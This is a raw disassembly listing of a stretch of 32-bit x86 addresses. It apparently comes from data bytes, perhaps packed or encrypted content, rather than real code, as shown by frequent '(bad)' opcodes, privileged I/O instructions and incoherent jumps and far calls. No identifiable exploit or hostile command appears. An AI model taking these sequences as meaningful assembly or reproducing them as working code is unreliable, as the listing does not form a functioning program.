  41548d:	pop    edx
  41548e:	or     eax,0xb67ac7ee
  415493:	ins    BYTE PTR es:[edi],dx
  415494:	test   al,0x18
  415496:	or     eax,0x5b37425c
  41549b:	cmp    BYTE PTR [eax-0x18c50026],bl
  4154a1:	(bad)  
  4154a2:	out    0x79,eax
  4154a4:	iret   
  4154a5:	rcr    BYTE PTR [esi+0x36],1
  4154a8:	in     eax,dx
  4154a9:	and    BYTE PTR [ebx],bh
  4154ab:	call   0xf839af48
  4154b0:	sar    edi,0xb9
  4154b3:	into   
  4154b4:	and    esi,DWORD PTR ds:0xe1615aac
  4154ba:	xchg   edi,eax
  4154bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154bc:	push   es
  4154bd:	sub    DWORD PTR [ebp-0x6],ebp
  4154c0:	aaa    
  4154c1:	xchg   ecx,eax
  4154c2:	clc    
  4154c3:	inc    edx
  4154c4:	mov    edx,DWORD PTR [esi+0x5cf7436e]
  4154ca:	ins    DWORD PTR es:[edi],dx
  4154cb:	push   ds
  4154cc:	xor    eax,0xc003abbf
  4154d1:	add    dh,BYTE PTR [esi-0x6a88bbb7]
  4154d7:	dec    ebx
  4154d8:	adc    BYTE PTR [ecx+0x7ad44473],cl
  4154de:	push   ds
  4154df:	aaa    
  4154e0:	or     edi,DWORD PTR [esi-0x5a]
  4154e3:	cmp    DWORD PTR [edi-0x3f425a33],eax
  4154e9:	inc    esi
  4154ea:	mov    dh,dl
  4154ec:	popa   
  4154ed:	and    BYTE PTR [eax],al
  4154ef:	shr    BYTE PTR [ebp+0x4efdb0e7],1
  4154f5:	dec    eax
  4154f6:	stc    
  4154f7:	or     cl,0x9b
  4154fa:	jmp    0x41551e
  4154fc:	adc    ebx,DWORD PTR fs:0x614ea235
  415503:	inc    edi
  415504:	adc    al,BYTE PTR [edx+ecx*2]
  415507:	xchg   esp,eax
  415508:	sub    cl,BYTE PTR [esi+0x2c]
  41550b:	lahf   
  41550c:	push   cs
  41550d:	stc    
  41550e:	sub    ebp,DWORD PTR [eax]
  415510:	xchg   ecx,eax
  415511:	xor    edx,DWORD PTR [ebp-0x51]
  415514:	retf   
  415515:	ins    BYTE PTR es:[edi],dx
  415516:	dec    ecx
  415517:	out    0x72,eax
  415519:	es jl  0x415554
  41551c:	repnz push edi
  41551e:	push   0x4d711daa
  415523:	in     al,0x3a
  415525:	xchg   ecx,eax
  415526:	dec    edi
  415527:	les    edi,FWORD PTR [edi]
  415529:	push   esi
  41552a:	dec    esi
  41552b:	xchg   edx,eax
  41552c:	out    0xfe,eax
  41552e:	push   edx
  41552f:	jno    0x41559a
  415531:	jge    0x4155ad
  415533:	push   esp
  415534:	mov    dh,0x38
  415536:	ret    
  415537:	test   eax,0xca015e47
  41553c:	rsqrtps xmm5,XMMWORD PTR [ebp+0x60b13f6f]
  415543:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415544:	je     0x41557c
  415546:	call   DWORD PTR [edx+0x7efd0746]
  41554c:	push   0xad1a36b9
  415551:	and    al,ah
  415553:	inc    esi
  415554:	and    BYTE PTR [edi-0x5d09c300],cl
  41555a:	pusha  
  41555b:	mov    al,0x8
  41555d:	pop    esp
  41555e:	fmul   st(0),st
  415560:	pop    ss
  415561:	pop    ss
  415562:	in     al,dx
  415563:	daa    
  415564:	add    bl,bh
  415566:	add    DWORD PTR [esi],ebp
  415568:	pop    edi
  415569:	fcom   DWORD PTR [edi+0x1b]
  41556c:	inc    ecx
  41556d:	lock add BYTE PTR [eax],al
	...
  4155d4:	add    BYTE PTR [eax],al
  4155d6:	in     al,0xf0
  4155d8:	sub    DWORD PTR [edx],ecx
  4155da:	cmp    eax,0xa2fee7db
  4155df:	arpl   WORD PTR [ebx],bp
  4155e1:	je     0x415614
  4155e3:	or     eax,0xe6672bc0
  4155e8:	add    BYTE PTR [eax],al
  4155ea:	add    BYTE PTR [ecx],al
  4155ec:	add    BYTE PTR [eax],al
  4155ee:	test   al,0xf5
  4155f0:	aaa    
  4155f1:	xor    al,0x75
  4155f3:	mov    WORD PTR [ecx],gs
  4155f5:	test   BYTE PTR gs:[ebx+ebx*2],al
  4155f9:	test   eax,0xdcbae02
  4155fe:	dec    ecx
  4155ff:	ret    
  415600:	int    0x6a
  415602:	mov    ah,0xe8
  415604:	xor    ebx,DWORD PTR [edi-0x61]
  415607:	jo     0x41565a
  415609:	cmp    ah,al
  41560b:	mov    DWORD PTR [esi],ebp
  41560d:	xchg   edi,eax
  41560e:	or     dl,ah
  415610:	mul    DWORD PTR [edi+0x55aa0c5f]
  415616:	imul   DWORD PTR ds:0x24d0661d
  41561c:	clc    
  41561d:	push   ecx
  41561e:	stos   DWORD PTR es:[edi],eax
  41561f:	push   edx
  415620:	xor    eax,0xc568277e
  415625:	mov    eax,ds:0xbdbea4de
  41562a:	jb     0x415695
  41562c:	ror    edi,0x76
  41562f:	ds inc edx
  415631:	xor    BYTE PTR [ebx-0x3a997c12],dh
  415637:	int    0xd6
  415639:	loopne 0x415667
  41563b:	rcl    DWORD PTR ds:0x3a75f96f,cl
  415641:	jno    0x415653
  415643:	add    bh,BYTE PTR [ecx-0x34]
  415646:	sbb    al,0xbe
  415648:	jbe    0x415698
  41564a:	(bad)  
  41564b:	and    dh,BYTE PTR [edi]
  41564d:	or     al,0x9e
  41564f:	xchg   esp,eax
  415650:	gs mov esp,0x11584b3
  415656:	add    esi,DWORD PTR [ecx-0x69]
  415659:	push   cs
  41565a:	(bad)  
  41565c:	popf   
  41565d:	jle    0x4156c7
  41565f:	push   0x7ff24d9a
  415664:	aad    0x9b
  415666:	xor    dh,ah
  415668:	mov    dh,0xf
  41566a:	jg     0x4156b8
  41566c:	adc    ecx,esi
  41566e:	adc    eax,0x1a203444
  415673:	push   ecx
  415674:	adc    eax,0x1cea0a8e
  415679:	adc    DWORD PTR [eax-0x4611698b],ebx
  41567f:	xor    DWORD PTR [ebp+0xf444e63],edx
  415685:	and    DWORD PTR [ebx+0x47],ebx
  415688:	inc    ebx
  415689:	call   0xda88063a
  41568e:	add    BYTE PTR [eax+0x6e],ch
  415691:	mov    al,0xf4
  415693:	push   es
  415694:	pop    edi
  415695:	jne    0x415706
  415697:	add    DWORD PTR [esi],esp
  415699:	or     DWORD PTR [ebx-0x7b],eax
  41569c:	push   ebp
  41569d:	cdq    
  41569e:	sbb    DWORD PTR [edi],eax
  4156a0:	and    ch,cl
  4156a2:	pop    eax
  4156a3:	mov    bh,0x3c
  4156a5:	sbb    al,dl
  4156a7:	and    DWORD PTR [ebx-0x2],edx
  4156aa:	rcl    edx,1
  4156ac:	push   ss
  4156ad:	jg     0x41572b
  4156af:	inc    ecx
  4156b0:	xchg   BYTE PTR [ecx-0x7679a1a7],cl
  4156b6:	and    eax,0x1b91577d
  4156bb:	iret   
  4156bc:	mov    ebp,0x456f1fd0
  4156c1:	stos   BYTE PTR es:[edi],al
  4156c2:	or     al,0xe9
  4156c4:	call   0x74f8:0xff869f3a
  4156cb:	jmp    0x1f00:0x3780a958
  4156d2:	push   cs
  4156d3:	lods   al,BYTE PTR ds:[esi]
  4156d4:	jmp    0x4156f0
  4156d6:	lahf   
  4156d7:	rcr    DWORD PTR [ebp-0x6e2fe7fc],cl
  4156dd:	or     DWORD PTR [ebx],ecx
  4156df:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4156e1:	ret    
  4156e2:	inc    ebp
  4156e3:	pop    eax
  4156e4:	retf   
  4156e5:	xchg   ebx,eax
  4156e6:	(bad)  
  4156e7:	in     eax,dx
  4156e8:	mov    edx,0xc8b80195
  4156ed:	mov    BYTE PTR [eax],al
	...
  415753:	add    BYTE PTR [eax],al
  415755:	add    BYTE PTR [ebp-0x66],ch
  415758:	mov    esp,0xfd67ff45
  41575d:	mov    edx,0x2c46bab3
  415762:	jecxz  0x41570a
  415764:	push   eax
  415765:	mov    bh,0x67
  415767:	out    0x0,eax
  415769:	add    BYTE PTR [eax],al
  41576b:	add    DWORD PTR [eax],eax
  41576d:	add    BYTE PTR [ecx-0x1f],al
  415770:	bound  esp,QWORD PTR [ebp-0x7041cbce]
  415776:	inc    edi
  415777:	cmp    dl,BYTE PTR [edi+eax*4+0x4a]
  41577b:	push   ebp
  41577c:	push   ebx
  41577d:	xchg   edx,eax
  41577f:	adc    bh,ch
  415781:	test   eax,0x365e7864
  415786:	push   es
  415787:	and    BYTE PTR [edi+0x7e],0x72
  41578b:	dec    esi
  41578c:	xchg   esi,eax
  41578d:	xchg   ebx,eax
  41578e:	std    
  41578f:	mov    ds:0x64ea96d8,al
  415794:	imul   esi,DWORD PTR [eax+0x5a],0xffffffc6
  415798:	xor    al,0x9c
  41579a:	cli    
  41579b:	(bad)  
  41579c:	shr    ecx,cl
  41579e:	inc    esi
  41579f:	je     0x4157f1
  4157a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157a2:	jno    0x415809
  4157a4:	inc    eax
  4157a5:	push   ecx
  4157a6:	imul   edx,DWORD PTR ds:0x834a,0x5
  4157ac:	addr16 ror edx,cl
  4157af:	mov    DWORD PTR ds:0x659571cf,ebp
  4157b5:	jno    0x415788
  4157b7:	bound  ebx,QWORD PTR ds:[ecx]
  4157ba:	aaa    
  4157bb:	xchg   ebx,eax
  4157bc:	pop    es
  4157bd:	rcl    BYTE PTR [eax+0x56],1
  4157c0:	add    eax,DWORD PTR [ebp+ebx*2-0x73]
  4157c4:	das    
  4157c5:	daa    
  4157c6:	fimul  DWORD PTR ds:0xfe340836
  4157cc:	sbb    al,0x10
  4157ce:	push   es
  4157cf:	adc    eax,0x7f4a840d
  4157d4:	sub    eax,0xb545e836
  4157d9:	in     eax,dx
  4157da:	mov    DWORD PTR [edi+edi*2-0x1a],0x6700505f
  4157e2:	push   ecx
  4157e3:	sbb    ebp,DWORD PTR [esp+0x3cea61fe]
  4157ea:	adc    DWORD PTR [esi],edx
  4157ec:	arpl   WORD PTR [edx-0x3fdbdad1],si
  4157f2:	jmp    0xbd53cce4
  4157f7:	mov    ecx,0xfd8edad4
  4157fc:	sub    BYTE PTR [esi],bl
  4157fe:	push   ds
  4157ff:	cdq    
  415800:	hlt    
  415801:	push   ecx
  415802:	jno    0x4157b8
  415804:	fldenv [edi+edx*8+0x25daef70]
  41580b:	cmp    BYTE PTR [ebx],bh
  41580d:	or     edi,DWORD PTR [eax-0x2f]
  415810:	mov    ebx,0x4fae4694
  415815:	sbb    al,0xb0
  415817:	jnp    0x415848
  415819:	mov    ebx,0x96cd4e87
  41581f:	je     0x415851
  415821:	cmp    eax,0x626e6579
  415826:	popf   
  415827:	sbb    al,0xf3
  415829:	rol    DWORD PTR [ecx+0x552c3d04],0x87
  415830:	push   ebx
  415831:	mov    eax,ds:0x88f3b13b
  415836:	(bad)  [ecx+edx*1-0x154241f]
  41583d:	sahf   
  41583e:	(bad)  
  41583f:	sar    BYTE PTR [esi+eiz*1+0x2d],1
  415843:	mov    dh,0xb1
  415845:	push   es
  415846:	jbe    0x415882
  415848:	fstp   QWORD PTR [edx]
  41584a:	push   edi
  41584b:	pop    ds
  41584c:	pushf  
  41584d:	(bad)  
  41584e:	jae    0x415826
  415850:	pop    ecx
  415851:	jb     0x4158d2
  415853:	xchg   ch,bl
  415855:	daa    
  415856:	add    BYTE PTR [edx],bh
  415858:	jns    0x4158a1
  41585a:	sbb    BYTE PTR [ebx-0x3db9e42f],bh
  415860:	fnstsw WORD PTR [eax+0x34]
  415863:	fwait
  415864:	or     dl,bh
  415866:	jecxz  0x415817
  415868:	stc    
  415869:	inc    esi
  41586a:	mov    al,ds:0xbe5748
	...
  4158d3:	add    BYTE PTR [eax],al
  4158d5:	add    bl,cl
  4158d7:	(bad)  
  4158d8:	xchg   ebx,eax
  4158d9:	in     al,dx
  4158da:	mov    bh,0xed
  4158dc:	(bad)  
  4158dd:	inc    DWORD PTR [edi]
  4158df:	(bad)  
  4158e1:	sar    esi,cl
  4158e3:	int    0x5d
  4158e5:	xchg   DWORD PTR [edi-0x18],esp
  4158e8:	add    BYTE PTR [eax],al
  4158ea:	add    BYTE PTR [ecx],al
  4158ec:	add    BYTE PTR [eax],al
  4158ee:	into   
  4158ef:	pop    esp
  4158f0:	xor    DWORD PTR [edx+ecx*2+0x556c15e6],ecx
  4158f7:	gs jl  0x415891
  4158fa:	mov    bh,0xed
  4158fc:	adc    al,0xc6
  4158fe:	sbb    dh,dh
  415900:	lahf   
  415901:	mov    ah,0x11
  415903:	out    dx,al
  415904:	in     al,0x38
  415906:	push   edx
  415907:	aad    0x37
  415909:	fadd   st,st(5)
  41590b:	jns    0x41592b
  41590d:	data16 icebp 
  41590f:	inc    ecx
  415910:	or     eax,0x5676d401
  415915:	mov    dl,0x54
  415917:	jl     0x41589d
  415919:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41591a:	jbe    0x4158d5
  41591c:	pushf  
  41591d:	ror    DWORD PTR [esi-0x1e],cl
  415920:	pop    ecx
  415921:	jl     0x415922
  415923:	inc    edi
  415924:	mov    al,0x7
  415926:	adc    al,0x52
  415928:	adc    DWORD PTR fs:0x6e523229,eax
  41592f:	mov    edx,0xc252bd02
  415934:	das    
  415935:	mov    bh,0xca
  415937:	mov    esi,DWORD PTR [edi+0x9f0f8bd]
  41593d:	push   ds
  41593e:	add    eax,0xcaf0a73b
  415943:	sbb    ebx,DWORD PTR [ebx+0x13]
  415946:	in     eax,dx
  415947:	outs   dx,BYTE PTR ds:[esi]
  415948:	jbe    0x415964
  41594a:	or     BYTE PTR [edi+ebx*2+0x3951f270],bh
  415951:	mov    ebx,0x5b62bee4
  415956:	push   esp
  415957:	ss icebp 
  415959:	or     eax,0x61b5c65c
  41595e:	lock push edx
  415960:	or     eax,0xa59b6c6b
  415965:	add    bh,bl
  415967:	fstp   QWORD PTR cs:[ebp-0x2b]
  41596b:	(bad)  
  41596c:	cld    
  41596d:	inc    edx
  41596e:	pushf  
  41596f:	fiadd  DWORD PTR [edx]
  415971:	sub    edi,DWORD PTR [eax]
  415973:	mov    cl,0xee
  415975:	sbb    dl,cl
  415977:	xchg   esp,eax
  415978:	mov    ebx,0xec56fd8
  41597d:	test   edx,eax
  41597f:	pushf  
  415980:	popa   
  415981:	frstor [edx+ecx*8+0x56]
  415985:	sbb    bh,BYTE PTR [ecx+0x28]
  415988:	push   eax
  415989:	add    BYTE PTR [esi+0x58],dl
  41598c:	xor    dh,bh
  41598e:	es cwde 
  415990:	push   cs
  415991:	into   
  415992:	mov    DWORD PTR [edi+0x39b28a23],esp
  415998:	out    dx,eax
  415999:	xchg   esi,eax
  41599a:	mov    ebp,0x13c722eb
  41599f:	adc    DWORD PTR [ecx-0x724ed124],ecx
  4159a5:	jnp    0x4159f2
  4159a7:	stc    
  4159a8:	adc    esi,DWORD PTR [edx+0x60]
  4159ab:	xchg   DWORD PTR [edx+0x1],ebx
  4159ae:	ja     0x4159f1
  4159b0:	sbb    DWORD PTR [ecx],edx
  4159b2:	(bad)  
  4159b3:	(bad)  
  4159b5:	scas   eax,DWORD PTR es:[edi]
  4159b6:	addr16 ja 0x41594e
  4159b9:	add    dh,BYTE PTR [edx-0x37]
  4159bc:	xor    al,0x40
  4159be:	test   al,0x6e
  4159c0:	outs   dx,DWORD PTR ds:[esi]
  4159c1:	lahf   
  4159c2:	mov    WORD PTR [ebp-0x9],gs
  4159c5:	daa    
  4159c6:	push   ebx
  4159c7:	repz jns 0x415a21
  4159ca:	or     DWORD PTR [ecx-0x9],ebp
  4159cd:	in     eax,0xe6
  4159cf:	cli    
  4159d0:	and    dh,BYTE PTR [ebp-0x4dfc77b1]
  4159d6:	mov    al,0xb3
  4159d8:	xchg   DWORD PTR [ebp+0x70a74086],esi
  4159de:	stos   BYTE PTR es:[edi],al
  4159df:	add    al,0x1e
  4159e1:	mov    BYTE PTR [eax+ecx*2],dl
  4159e4:	daa    
  4159e5:	fs icebp 
  4159e7:	sbb    BYTE PTR [ebx],ch
  4159e9:	out    dx,al
  4159ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159eb:	xor    eax,DWORD PTR [edi]
  4159ed:	dec    ebp
	...
  415a56:	inc    ebp
  415a57:	mov    BYTE PTR [edi+esi*2],ch
  415a5a:	in     eax,dx
  415a5b:	neg    DWORD PTR [edi-0x46]
  415a5e:	sub    edi,DWORD PTR [edi-0x10]
  415a61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a62:	das    
  415a63:	cmp    cl,BYTE PTR [edx]
  415a65:	jns    0x415ace
  415a67:	jmp    0x1415a6c
  415a6c:	add    BYTE PTR [eax],al
  415a6e:	pushf  
  415a6f:	cli    
  415a70:	jp     0x415a51
  415a72:	test   al,0x72
  415a74:	jbe    0x415a2f
  415a76:	lods   eax,DWORD PTR ds:[esi]
  415a77:	cmp    al,0xfa
  415a79:	nop
  415a7a:	fadd   st(2),st
  415a7c:	sub    al,0x2f
  415a7e:	adc    BYTE PTR [ebp+0x47],bh
  415a81:	sbb    eax,0x13e83f0c
  415a86:	cmp    dh,BYTE PTR [edi+0x3b]
  415a89:	mov    al,ds:0xe019dc20
  415a8e:	jp     0x415aad
  415a90:	xor    DWORD PTR [edx+0x45],eax
  415a93:	rcl    DWORD PTR [esi],0x83
  415a96:	sub    al,0xff
  415a98:	jno    0x415a3c
  415a9a:	(bad)
  415a9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a9e:	or     BYTE PTR [ebp-0x6626f1b9],ch
  415aa4:	cli    
  415aa5:	es ss sbb esi,edi
  415aa9:	adc    esp,ebp
  415aab:	inc    ecx
  415aac:	ror    DWORD PTR [edi+0x4b],cl
  415aaf:	and    edi,DWORD PTR [ebp-0x43]
  415ab2:	inc    esi
  415ab3:	ret    
  415ab4:	fwait
  415ab5:	retf   0x815e
  415ab8:	(bad)  
  415ab9:	sbb    ah,ah
  415abb:	push   0xc
  415abd:	retf   
  415abe:	jb     0x415a83
  415ac0:	lods   al,BYTE PTR ds:[esi]
  415ac1:	mov    ecx,0xbef85a50
  415ac6:	sub    DWORD PTR [ecx-0x22],0x3c2f99e2
  415acd:	pop    ss
  415ace:	dec    ebx
  415acf:	popa   
  415ad0:	xchg   ebp,eax
  415ad1:	cwde   
  415ad2:	mov    eax,0x634d8676
  415ad7:	sbb    dl,bl
  415ad9:	sub    cl,bl
  415adb:	rcl    DWORD PTR [edi],1
  415add:	adc    edi,esi
  415adf:	adc    DWORD PTR [eax],eax
  415ae1:	dec    edx
  415ae2:	xor    esi,DWORD PTR [eax-0x77]
  415ae5:	(bad)  
  415ae6:	fdivr  QWORD PTR [ebx-0xf0cfc50]
  415aec:	ds jmp 0x415ab7
  415aef:	inc    esi
  415af0:	lock ret 0x957a
  415af4:	hlt    
  415af5:	into   
  415af6:	jb     0x415b76
  415af8:	rcr    BYTE PTR [ebp-0x29c04089],cl
  415afe:	jmp    0x415b74
  415b00:	adc    eax,0x73aab9a5
  415b05:	in     eax,dx
  415b06:	pop    ebx
  415b07:	inc    edi
  415b08:	add    al,0xba
  415b0a:	mov    eax,0xdfba8323
  415b0f:	fmul   DWORD PTR [ebx+esi*2]
  415b12:	in     al,dx
  415b13:	push   edx
  415b14:	mov    edi,0x8f830fdd
  415b19:	mov    bl,dh
  415b1b:	mov    ebp,0xcbcd1a41
  415b20:	jno    0x415aa9
  415b22:	xchg   BYTE PTR [ecx-0x5f],bl
  415b25:	and    eax,0x7d355ddd
  415b2a:	aam    0xc9
  415b2c:	sub    eax,0xc346479c
  415b31:	push   esi
  415b32:	iret   
  415b33:	mov    ah,0x52
  415b35:	out    dx,eax
  415b36:	add    eax,DWORD PTR [eax]
  415b38:	lods   al,BYTE PTR ds:[esi]
  415b39:	loop   0x415ae2
  415b3b:	iret   
  415b3c:	jp     0x415b26
  415b3e:	jmp    0x415af2
  415b40:	fcmovnbe st,st(5)
  415b42:	xor    eax,0x7ed955a1
  415b47:	and    DWORD PTR [ecx],esi
  415b49:	xor    BYTE PTR [esi],bl
  415b4b:	shl    BYTE PTR [ebx+edi*1+0x0],cl
  415b4f:	inc    ecx
  415b50:	aam    0xb0
  415b52:	xor    edi,esi
  415b54:	sub    al,0xd
  415b56:	mov    WORD PTR [edx-0x5c5b8c81],gs
  415b5c:	inc    esi
  415b5d:	push   edi
  415b5e:	sub    al,0xc
  415b60:	cli    
  415b61:	iret   
  415b62:	and    DWORD PTR [ecx-0x2c],edx
  415b65:	mov    bl,0xe7
  415b67:	shl    esi,0xed
  415b6a:	sbb    DWORD PTR [esi+0x3d15],ebp
	...
  415bd4:	add    BYTE PTR [eax],al
  415bd6:	fistp  QWORD PTR [esi-0x449a6dfb]
  415bdc:	(bad)  
  415bde:	stc    
  415bdf:	dec    ebp
  415be0:	push   ss
  415be1:	fsubr  st(4),st
  415be3:	popa   
  415be4:	inc    ecx
  415be5:	arpl   WORD PTR [edi-0x16],sp
  415be8:	add    BYTE PTR [eax],al
  415bea:	add    BYTE PTR [ecx],al
  415bec:	add    BYTE PTR [eax],al
  415bee:	mov    ebp,0xf0febd36
  415bf3:	mov    ecx,0x56d2e537
  415bf8:	pushf  
  415bf9:	fisttp QWORD PTR [edi-0x37d5b665]
  415bff:	dec    di
  415c01:	push   eax
  415c02:	es push edx
  415c04:	(bad)  
  415c05:	mov    ecx,0x55f0b9c9
  415c0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c0b:	out    dx,al
  415c0c:	or     DWORD PTR [ebx+0x1fd83405],edi
  415c12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c13:	sub    esi,DWORD PTR [ebx]
  415c15:	sub    esp,DWORD PTR [edx+edx*1-0x7596617e]
  415c1c:	in     al,0x14
  415c1e:	xchg   edx,eax
  415c1f:	cmp    BYTE PTR [eax+ebp*8-0xe],0xe0
  415c24:	clc    
  415c25:	mov    cl,0xa3
  415c27:	cmp    ecx,DWORD PTR [edx-0x2b]
  415c2a:	mov    ch,0xac
  415c2c:	sub    esp,DWORD PTR [eax-0x507b61bd]
  415c32:	mov    edi,0x3e121729
  415c37:	jl     0x415c9c
  415c39:	add    edi,DWORD PTR [edx]
  415c3b:	div    BYTE PTR [ebx-0x71deec18]
  415c41:	loopne 0x415c70
  415c43:	push   ebx
  415c44:	outs   dx,DWORD PTR ds:[esi]
  415c45:	jl     0x415c7a
  415c47:	in     eax,0x14
  415c49:	jge    0x415c6c
  415c4b:	cs loopne 0x415c2c
  415c4e:	fsubrp st(2),st
  415c50:	and    dl,BYTE PTR [edi-0x1124a75d]
  415c56:	daa    
  415c57:	daa    
  415c58:	jne    0x415c0a
  415c5a:	mov    esp,0x5d999a81
  415c5f:	call   0xaeb:0xce28bc92
  415c66:	std    
  415c67:	(bad)
  415c6a:	int3   
  415c6b:	jge    0x415cbe
  415c6d:	dec    esp
  415c6e:	inc    ecx
  415c6f:	ins    BYTE PTR es:[edi],dx
  415c70:	xchg   ebp,eax
  415c71:	out    0x8b,eax
  415c73:	xchg   esp,eax
  415c74:	in     al,0xba
  415c76:	cdq    
  415c77:	fisub  WORD PTR [edx]
  415c79:	or     esp,DWORD PTR [ebx-0x11c9b201]
  415c7f:	jle    0x415cc1
  415c81:	push   esp
  415c82:	mov    dh,0xf8
  415c84:	push   es
  415c85:	jmp    0x415c8e
  415c87:	outs   dx,DWORD PTR ds:[esi]
  415c88:	mov    ah,0xf9
  415c8a:	in     eax,dx
  415c8b:	rol    DWORD PTR [edx],1
  415c8d:	xchg   edx,eax
  415c8e:	dec    ecx
  415c8f:	xchg   ebx,eax
  415c90:	mov    ah,0x96
  415c92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c93:	mov    cl,0x49
  415c95:	xor    al,BYTE PTR [eax-0x3e643862]
  415c9b:	jecxz  0x415cd3
  415c9d:	jmp    0x4c6f1ea0
  415ca2:	push   edx
  415ca3:	lods   eax,DWORD PTR ds:[esi]
  415ca4:	lds    edx,FWORD PTR [ebx-0x7f]
  415ca7:	and    al,0x7c
  415ca9:	inc    edx
  415caa:	pusha  
  415cab:	loop   0x415c3d
  415cad:	push   ds
  415cae:	retf   
  415caf:	cmp    DWORD PTR [edi+0x7d45691a],ebp
  415cb5:	mov    ds:0x9af5bd9c,eax
  415cba:	jne    0x415cca
  415cbc:	push   eax
  415cbd:	fist   DWORD PTR [esi-0x24e910f4]
  415cc3:	push   cs
  415cc4:	adc    al,0x5e
  415cc6:	fidiv  WORD PTR ds:0x5aa66438
  415ccc:	mov    cl,0xb4
  415cce:	jns    0x415c53
  415cd0:	inc    eax
  415cd1:	or     BYTE PTR [edx],dl
  415cd3:	pop    ds
  415cd4:	push   esp
  415cd5:	addr16 cmp edx,ebp
  415cd8:	sub    ebp,DWORD PTR [ebx+0x215d7ec9]
  415cde:	int3   
  415cdf:	fsub   DWORD PTR [ebp-0x715fe9fd]
  415ce5:	mov    ds:0x36cac340,al
  415cea:	jo     0x415d51
  415cec:	mov    eax,edx
	...
  415d56:	cmp    dl,BYTE PTR [eax]
  415d58:	mov    edi,0xbbbfbf3c
  415d5d:	push   ss
  415d5e:	push   esp
  415d5f:	push   ecx
  415d60:	mov    esi,0xdd8cf51f
  415d65:	jl     0x415dce
  415d67:	jmp    0x415d69
  415d69:	add    BYTE PTR [eax],al
  415d6b:	add    DWORD PTR [eax],eax
  415d6d:	add    BYTE PTR [ebx+0x69],dh
  415d70:	sub    cl,dl
  415d72:	jbe    0x415d09
  415d74:	mov    ch,0xc5
  415d76:	outs   dx,DWORD PTR ds:[esi]
  415d77:	imul   ecx,DWORD PTR [ebx+eiz*8+0x64],0x3171c4e3
  415d7f:	in     al,0xc0
  415d81:	and    bl,bh
  415d83:	cli    
  415d84:	jl     0x415dd9
  415d86:	inc    esi
  415d87:	stos   DWORD PTR es:[edi],eax
  415d88:	and    DWORD PTR [ebx],eax
  415d8a:	into   
  415d8b:	cli    
  415d8c:	(bad)  
  415d8d:	fldcw  WORD PTR [eax-0x2c8c0837]
  415d93:	mov    eax,cs:0x63a8ad75
  415d99:	test   al,0xcb
  415d9b:	fidivr DWORD PTR [esi+0x62]
  415d9e:	addr16 (bad) 
  415da0:	call   0x19c0f6b1
  415da5:	or     edx,DWORD PTR [eax]
  415da7:	call   0x8f0cdcb9
  415dac:	(bad)  
  415dae:	cmp    BYTE PTR [esi],al
  415db0:	shr    DWORD PTR [ebp+edx*8+0x55],cl
  415db4:	or     DWORD PTR [ebp-0x660f73b0],0xa7f0637d
  415dbe:	(bad)  
  415dbf:	not    BYTE PTR [edi-0x2]
  415dc2:	jg     0x415d6c
  415dc4:	lods   al,BYTE PTR ds:[esi]
  415dc5:	scas   eax,DWORD PTR es:[edi]
  415dc6:	mov    bh,0xbf
  415dc8:	adc    DWORD PTR [eax],0x22
  415dcb:	mov    ds:0xf64e0c5b,eax
  415dd0:	outs   dx,DWORD PTR ds:[esi]
  415dd1:	sbb    eax,0xb8bdca28
  415dd6:	xchg   DWORD PTR [edx],esp
  415dd8:	push   ss
  415dd9:	sub    al,0x2b
  415ddb:	popa   
  415ddc:	mov    DWORD PTR [edi],ebx
  415dde:	loop   0x415e03
  415de0:	pop    ecx
  415de1:	pop    edi
  415de2:	rcl    DWORD PTR [esi],1
  415de4:	in     al,0x7
  415de6:	scas   al,BYTE PTR es:[edi]
  415de7:	call   0xcf1a:0x3be3528c
  415dee:	xlat   BYTE PTR ds:[ebx]
  415def:	jae    0x415de3
  415df1:	dec    eax
  415df2:	jge    0x415dbc
  415df4:	ja     0x415dea
  415df6:	pop    ebp
  415df7:	jb     0x415e3b
  415df9:	xlat   BYTE PTR ds:[ebx]
  415dfa:	into   
  415dfb:	mov    bh,BYTE PTR [esi-0x7ae2b8e7]
  415e01:	or     DWORD PTR [ecx-0x384a99e1],eax
  415e07:	hlt    
  415e08:	mov    DWORD PTR [edi+edi*4],ebp
  415e0b:	or     eax,0x1678179e
  415e10:	mov    ch,ch
  415e12:	lock stos BYTE PTR es:[edi],al
  415e14:	mov    esi,0x338b01bd
  415e19:	or     bl,BYTE PTR [edi]
  415e1b:	sbb    eax,0x7d127e7
  415e20:	sbb    eax,0xa6f830cc
  415e25:	icebp  
  415e26:	sbb    esi,DWORD PTR [eax+eiz*1]
  415e29:	jns    0x415e67
  415e2b:	lds    esp,FWORD PTR [ecx-0x390ed90c]
  415e31:	les    edi,FWORD PTR [esi-0x1d]
  415e34:	mov    cl,0x8b
  415e36:	mov    edi,0x54cb0b1a
  415e3b:	mov    dh,0xe3
  415e3d:	mov    ah,dl
  415e3f:	ins    BYTE PTR es:[edi],dx
  415e40:	in     al,dx
  415e41:	dec    eax
  415e42:	dec    ebx
  415e43:	int3   
  415e44:	xchg   ecx,eax
  415e45:	adc    eax,0x4f259da0
  415e4a:	repnz xor bh,dl
  415e4d:	in     eax,dx
  415e4e:	retf   0x5b21
  415e51:	ss jno 0x415e34
  415e54:	mov    esp,0x9ba0d8ac
  415e59:	fidivr WORD PTR [esp+edx*2]
  415e5c:	in     al,dx
  415e5d:	inc    edx
  415e5e:	cmp    BYTE PTR [esi],dh
  415e60:	inc    ecx
  415e61:	pavgb  xmm6,XMMWORD PTR [esi]
  415e65:	leave  
  415e66:	test   BYTE PTR [edx],al
  415e68:	ins    BYTE PTR es:[edi],dx
  415e69:	inc    edx
  415e6a:	in     eax,0x34
  415e6c:	cs inc ecx
	...
  415ed6:	out    dx,al
  415ed7:	repnz cmc 
  415ed9:	add    edi,ebp
  415edb:	pop    es
  415edc:	(bad)  
  415edd:	call   FWORD PTR [ebp+0x1f]
  415ee0:	les    esi,FWORD PTR [eax-0x79]
  415ee3:	test   BYTE PTR [eax+ecx*1+0xec67],dh
